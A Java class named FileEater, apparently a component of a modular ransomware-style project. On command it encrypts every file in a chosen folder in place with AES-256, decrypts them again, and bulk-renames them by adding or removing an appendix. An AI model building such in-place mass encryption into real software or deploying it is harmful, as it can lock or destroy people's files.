import cryptoUnit.CryptoUnit;
import fileIO.FileIO;

import java.io.File;

public class FileEater {
    private static final FileEater instance = new FileEater();
    public Port port;
    private String path;
    private FileIO fileIO = new FileIO();
    private CryptoUnit cryptoUnit = new CryptoUnit();

    private FileEater() {
        this.port = new Port();
    }


    public static FileEater getInstance() {
        return instance;
    }

    public String innerSetPath(String path) {
        this.path = path;
        return path;
    }

    public Boolean innerEncrypt() {
        File folder = new File(this.path);
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                fileIO.writeFile(file, cryptoUnit.encryptAES256(fileIO.readFile(file)));
            }
        }
        return true;
    }

    public Boolean innerDecypt() {
        File folder = new File(this.path);
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                fileIO.writeFile(file, cryptoUnit.decryptAES256(fileIO.readFile(file)));
            }
        }
        return true;
    }

    public Boolean innerRename(String appendix, Boolean shouldBeAdded) {
        File folder = new File(this.path);
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                fileIO.renameFile(file, appendix, shouldBeAdded);
            }
        }
        return true;
    }

    public class Port implements IFileEater {
        @Override
        public String setPath(String path) {
            return innerSetPath(path);
        }

        @Override
        public Boolean encrypt() {
            return innerEncrypt();
        }

        @Override
        public Boolean decrypt() {
            return innerDecypt();
        }

        @Override
        public Boolean rename(String appendix, Boolean shouldBeAdded) {
            return innerRename(appendix, shouldBeAdded);
        }
    }
}
